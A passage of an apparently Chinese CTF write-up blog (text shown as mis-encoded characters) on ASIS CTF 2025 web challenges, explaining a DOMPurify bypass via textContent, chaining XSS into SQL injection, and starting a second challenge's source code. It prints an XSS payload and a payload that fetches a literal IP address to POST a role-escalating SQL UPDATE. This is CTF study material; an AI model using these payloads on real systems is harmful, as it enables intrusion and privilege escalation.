</span></span></code></pre></div><p>æœ‰ä¸€ä¸ªåœ°æ–¹å…·æœ‰Sqlæ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥UPDATEæˆ‘ä»¬çš„roleå‘¢ï¼Ÿ</p>
<h2 class="relative group">åˆ©ç”¨ 
    <div class="anchor" id="åˆ©ç”¨"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8">#</a>
</span>
</h2>
<h3 class="relative group">CSRFï¼Ÿ 
    <div class="anchor" id="csrf"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#csrf">#</a>
</span>
</h3>
<p>åœ¨è¿™ä¸ªå¸ˆå‚…çš„wpä¸­å†™åˆ°ä¸€ä¸ªæ€è·¯ï¼Œå¯ä¸å¯ä»¥ç”¨botçš„visitåŠŸèƒ½å†™ä¸€ä¸ªCSRFæ¥ç»™æˆ‘ä»¬æ”¹ä¸€ä¸ªroleå‘¢ï¼Ÿ
çœ‹åˆ°app.js</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">store</span><span class="o">:</span> <span class="k">new</span> <span class="nx">SQLiteStore</span><span class="p">({</span> <span class="nx">db</span><span class="o">:</span> <span class="s1">'sessions.sqlite'</span><span class="p">,</span> <span class="nx">dir</span><span class="o">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">'data'</span><span class="p">)</span> <span class="p">}),</span>
</span></span><span class="line"><span class="cl">  <span class="nx">secret</span><span class="o">:</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nx">resave</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">saveUninitialized</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">cookie</span><span class="o">:</span> <span class="p">{</span> <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">sameSite</span><span class="o">:</span> <span class="s1">'lax'</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}));</span>
</span></span></code></pre></div><p>çœ‹åˆ°ä¸€è¿™é‡Œcookieå¯¹äºsameSiteè®¾ç½®äº†laxï¼Œé‚£ä¹ˆå°±åªèƒ½ä½¿ç”¨GETã€HEADå’ŒOPTIONSè¿™ç§å®‰å…¨çš„è¯·æ±‚æ–¹æ³•ï¼Œå› ä¸ºä»–ä¸ä¼šæ”¹å˜ä»€ä¹ˆä¸œè¥¿ï¼Œå¹¶ä¸”è¦æ±‚æ˜¯è¦sameSiteçš„







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/3.png"/>
</figure>

æ‰€ä»¥åˆ©ç”¨CSRFå¹¶ä¸å¤ªå¯èƒ½å› ä¸ºæˆ‘ä»¬éœ€è¦åˆ©ç”¨POSTæ¥è¿›è¡Œæ³¨å…¥</p>
<h3 class="relative group">Xss To Sql Injection 
    <div class="anchor" id="xss-to-sql-injection"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#xss-to-sql-injection">#</a>
</span>
</h3>
<p>æ˜¾è€Œæ˜“è§ï¼Œæˆ‘ä»¬å¿…é¡»ç”¨superbotæ¥è¿›è¡Œæ³¨å…¥ï¼Œé‚£ä¹ˆç›®å‰è¿˜èƒ½æœ‰ä»€ä¹ˆæ–¹æ³•ï¼Ÿæ’é™¤ä¸€ç³»åˆ—æ¼æ´ï¼Œå…¶å®å¾ˆç®€å•å¯ä»¥æƒ³åˆ°XSSï¼Œé‚£æˆ‘ä»¬çš„å…·ä½“æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿ
æ€è·¯ï¼šæ‰¾åˆ°XSSç‚¹ï¼Œè®©superbotè¿›è¡Œpostè¯·æ±‚åˆ°/debug/create_logæ¥è¿›è¡Œæ³¨å…¥ä½¿å¾—æˆ‘ä»¬çš„roleå˜æˆuser</p>
<p>é‚£ä¹ˆå›åˆ°æˆ‘ä¹‹å‰å†™çš„æ–‡ç« ï¼Œæ€è€ƒçš„é—®é¢˜ï¼Œä¸¤ä¸ªè§’åº¦ï¼Œpayloadæ˜¯æ€ä¹ˆæ”¾åˆ°é¡µé¢ä¸Šçš„ï¼Œåˆæ˜¯å¦è¢«å­˜å‚¨äº†ï¼Ÿæˆ‘ä»¬å…ˆè€ƒè™‘å‰è€…</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"url"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">somethingWentWrong</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">8000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"div_url"</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span> <span class="s1">'visible'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">url_cleaned</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"msg_url"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">url_cleaned</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"input"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">"url"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">"url"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="s2">"input_url"</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">required</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"scrap_form"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">form</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"div_url"</span><span class="p">).</span><span class="nx">remove</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"error_url"</span><span class="p">).</span><span class="nx">remove</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"input"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">'&lt;input name="url" type="url" required placeholder="https://exemple.com" /&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>èµ·åˆæˆ‘çœ‹è§è¿™ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™å› ä¸ºçœ‹åˆ°äº†DOMPurify,æˆ‘è®¤ä¸ºæ²¡æˆäº†ï¼Œå› ä¸ºè¦ä¹ˆ0dayè¦ä¹ˆå°±æ˜¯XSSç»•è¿‡ä¸äº†ï¼Œä½†æ˜¯åœ¨è¿™ç¯‡wpå­¦åˆ°äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹æˆ‘ä»¬çš„urlä¼šè¢«æ”¾åˆ°ä»€ä¹ˆåœ°æ–¹?
1ã€somethingWentWrong</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">somethingWentWrong</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"msg_url"</span><span class="p">).</span><span class="nx">textContent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">error</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"error_url"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span> <span class="s1">'visible'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="sb">`Something went wrong while scrapping </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç›´æ¥æŠŠmsg_url.textContentç»™åˆ°äº†urlç„¶ååŠ å…¥åˆ°äº†innerHTMLä¸­ï¼Œé‚£æˆ‘æ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥æŠŠå†…å®¹æ”¹æˆpayloadç„¶åè§¦å‘å‘¢ï¼Ÿ</p>
<h4 class="relative group">å…³äºä¸€ä¸ªtextContentçš„trick 
    <div class="anchor" id="å…³äºä¸€ä¸ªtextcontentçš„trick"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%85%b3%e4%ba%8e%e4%b8%80%e4%b8%aatextcontent%e7%9a%84trick">#</a>
</span>
</h4>
<p>è¿™é‡ŒåŠ å…¥ä¸€ä¸ªtrickï¼Œå°±æ˜¯textContentå’ŒinnterTextçš„åŒºåˆ«
textContent gets the content ofÂ <em>all</em>Â elements, includingÂ <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script" target="_blank"><code>&lt;script&gt;</code></a>Â andÂ <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/style" target="_blank"><code>&lt;style&gt;</code></a>Â elements
<code>innerText</code>Â only shows â€œhuman-readableâ€ elements.
è€Œè¿™é‡Œå°±æ˜¯ç”¨äº†è¿™ä¸ªç‰¹æ€§ç»•è¿‡äº†DOMpurifyçš„é™åˆ¶ï¼Œå› ä¸ºä»–ä»¬å¾—å‡ºæ¥çš„éƒ½æ˜¯æ–‡æœ¬å†…å®¹ï¼Œå¹¶ä¸ä¼šè¢«purifyæ‰åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨æœ¬é¢˜ç›®ä¸­å°±æ˜¯
é¦–å…ˆæ˜¯textContentï¼Œç„¶åç»è¿‡DOMpurifyåå˜æˆäº†innerHTMLï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªtextContenté‡Œé¢åŒ…å«äº†xssçš„payloadå³å¯è§¦å‘xss</p>
<p>payload:<code>http://&lt;&lt;i&gt;img src onerror=alert(origin)&lt;/i&gt;&gt;</code>
<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/4.png"/>
</figure>
<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/5.png"/>
</figure>

å¯ä»¥çœ‹åˆ°å¹¶ä¸ä¼šè§¦å‘ï¼Œæ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºä»–æ˜¯åœ¨æŠ›å‡ºé”™è¯¯ä¸­çš„è€Œä¸æ˜¯mainå‡½æ•°ä¸­çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™8sçš„é™åˆ¶ç„¶åèµ°åˆ°</p>
<pre tabindex="0"><code>document.getElementById("msg_url").innerHTML = url_cleaned;
</code></pre><p>è¿™ä¸ªä½ç½®æ‰å¯ä»¥è§¦å‘xss
ä¸¤ä¸ªæ–¹å¼ï¼šæŠŠurlå†™æˆè‡ªå·±serverï¼Œé‡Œé¢å¼€ä¸€ä¸ªæœåŠ¡è®©ä»–å»¶è¿Ÿ8ç§’
æ–¹å¼äºŒï¼š







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/6.png"/>
</figure>

ä»»æ„é€‰ä¸€ä¸ªå³å¯







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/7.png"/>
</figure>

æ‰€ä»¥æœ€åé¢å°±æ˜¯æå‡roleäº†
å†çœ‹å›å»å…¶ä¸­çš„é™åˆ¶ï¼Œé•¿åº¦å°äº51ï¼Œä¸å…è®¸åŒ…å«<code>-</code>å’Œ<code>/</code>å·
æ„é€ ä¸€ä¸‹</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">logs</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">VALUES</span><span class="p">(</span><span class="s1">''</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="n">logs</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">''</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>paylaod:</p>
<pre tabindex="0"><code>&lt;img src=x onerror="fetch('http://101.132.122.178:7777/aaa',{method:'POST',body:new URLSearchParams({log: '\');UPDATE users SET role="user" WHERE id=2;SELECT'})})"&gt;
</code></pre>
<h2 class="relative group">æœ¬é¢˜å‚è€ƒé“¾æ¥ 
    <div class="anchor" id="æœ¬é¢˜å‚è€ƒé“¾æ¥"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%9c%ac%e9%a2%98%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5">#</a>
</span>
</h2>
<p>å†™çš„çœŸçš„è›®è¯¦ç»†çš„
<a href="https://siunam321.github.io/ctf/ASIS-CTF-Quals-2025/Web/ScrapScrap-I-Revenge/" target="_blank">https://siunam321.github.io/ctf/ASIS-CTF-Quals-2025/Web/ScrapScrap-I-Revenge/</a></p>
<h1 class="relative group">Under the beamers 
    <div class="anchor" id="under-the-beamers"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#under-the-beamers">#</a>
</span>
</h1>
<p>å¾ˆç®€å•çš„ä¸€é“é¢˜ç›®
è¿™é“é¢˜ä¼°è®¡æ˜¯æœ‰é—®é¢˜ï¼Œä¸ç„¶åé¢ä¹Ÿä¸ä¼šå‡ºrevange
å…ˆæ˜¯çœ‹ä¸€çœ¼index.html</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">"header"</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">			<span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Under</span> <span class="nx">the</span> <span class="nx">beamers</span><span class="o">&lt;</span><span class="err">/h1&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">HTML</span> <span class="nx">Renderer</span><span class="o">&lt;</span><span class="err">/h2&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="s2">"content"</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"Enter your HTML content here..."</span> <span class="nx">onkeyup</span><span class="o">=</span><span class="s2">"updateIframe()"</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">world</span><span class="o">&lt;</span><span class="err">/textarea&gt;</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="nx">p</span> <span class="kr">class</span><span class="o">=</span><span class="s2">"preview-label"</span><span class="o">&gt;</span><span class="nx">Preview</span> <span class="p">(</span><span class="nx">updates</span> <span class="mi">500</span><span class="nx">ms</span> <span class="nx">after</span> <span class="nx">typing</span> <span class="nx">stops</span><span class="p">)</span><span class="o">:&lt;</span><span class="err">/p&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">id</span><span class="o">=</span><span class="s2">"renderer"</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">function</span> <span class="nx">renderIframe</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">textarea</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"content"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"renderer"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">"textareaContent"</span><span class="p">,</span> <span class="nx">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s2">"Could not save to localStorage:"</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">htmlContent</span> <span class="o">=</span> <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;meta charset="UTF-8"&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;div&gt;</span><span class="si">${</span><span class="nx">content</span><span class="si">}</span><span class="sb">&lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">						var beamer_config = {
</span></span></span><span class="line"><span class="cl"><span class="sb">						  product_id : "TCocQlcK73424",
</span></span></span><span class="line"><span class="cl"><span class="sb">						  user_id: "00000000-0000-0000-0000-000000000000"
</span></span></span><span class="line"><span class="cl"><span class="sb">						};
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;\/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;script type="text/javascript" src="/beamer-embed.js" defer="defer"&gt;&lt;\/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">						setTimeout(() =&gt; { Beamer.update({language: "FR"}) }, 1000); /*
</span></span></span><span class="line"><span class="cl"><span class="sb">						window.Beamer&amp;&amp;window.Beamer.update()
</span></span></span><span class="line"><span class="cl"><span class="sb">						*/
</span></span></span><span class="line"><span class="cl"><span class="sb">					&lt;\/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="sb">				&lt;/html&gt;`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="nx">iframe</span><span class="p">.</span><span class="nx">srcdoc</span> <span class="o">=</span> <span class="nx">htmlContent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">debounceTimer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">function</span> <span class="nx">updateIframe</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">debounceTimer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="nx">debounceTimer</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">renderIframe</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kd">function</span> <span class="nx">getUrlParameter</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">urlParams</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kd">function</span> <span class="nx">loadSavedContent</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">textarea</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"content"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="kr">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">"html"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">"textareaContent"</span><span class="p">,</span> <span class="nx">html</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s2">"Could not save to localStorage:"</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="kr">const</span> <span class="nx">savedContent</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">"textareaContent"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="nx">savedContent</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">savedContent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s2">"Could not load from localStorage:"</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="nx">renderIframe</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
